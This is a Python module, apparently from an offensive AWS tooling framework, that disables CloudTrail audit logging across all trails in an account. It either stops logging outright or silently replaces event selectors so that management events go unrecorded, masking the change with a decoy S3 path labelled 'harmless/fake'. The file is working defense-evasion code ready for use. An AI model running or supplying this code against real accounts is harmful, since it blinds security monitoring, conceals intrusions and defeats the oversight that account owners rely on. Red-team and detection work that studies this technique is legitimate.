import argparse
import boto3
from botocore.exceptions import ClientError

from .DoorModule import DoorModule

class CloudTrailStop(DoorModule):
    class Meta:
        name = 'CloudTrail Stop Logging'
        help = 'Add a default event selector to mask management ReadWrite actions'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-s',
            '--stoplogging',
            help='Use well know stop logging instead of event selector',
            action='store_true',
        )

        args, _ = parser.parse_known_args(argv)
        self.stop_logging = args.stoplogging

    def run_event_selector(self):
        cloudtrail = boto3.client('cloudtrail')
        trails = cloudtrail.describe_trails()['trailList']
        for trail in trails:
            trail_name = trail['Name']
            print(f"[+] Adding event selector on {trail_name}")
            try:
                response = cloudtrail.put_event_selectors(
                    TrailName=trail_name,
                    EventSelectors=[
                        {
                            'ReadWriteType': 'All',
                            'IncludeManagementEvents': False,
                            'DataResources': [
                                {
                                    'Type': 'AWS::S3::Object',
                                    'Values': [
                                        'arn:aws:s3:::icloud-bucket/'  # harmless/fake path
                                    ]
                                },
                                {
                                    'Type': 'AWS::Lambda::Function',
                                    'Values': [
                                        'arn:aws:lambda:us-east-1:123456789012:function:backup-fct'
                                    ]
                                },
                                {
                                    'Type': 'AWS::DynamoDB::Table',
                                    'Values': [
                                        'arn:aws:dynamodb:us-east-1:123456789012:table/backup-table'
                                    ]
                                }
                            ]
                        }
                    ]
                )
                print(f"[+] Management events disabled on trail '{trail_name}'")
            except Exception as e:
                print(f"[x] Failed to update event selectors: {e}")

    def run_stop_logging(self):
        cloudtrail = boto3.client('cloudtrail')
        trails = cloudtrail.describe_trails()['trailList']
        for trail in trails:
            trail_name = trail['Name']
            try:
                cloudtrail.stop_logging(
                    Name=trail_name
                )
                print(f"[+] Trail logging stopped on '{trail_name}'")
            except ClientError as e:
                print(f"[x] Failed to stop logging: {e}")

    def run(self):
        if self.stop_logging:
            self.run_stop_logging()
        else:
            self.run_event_selector()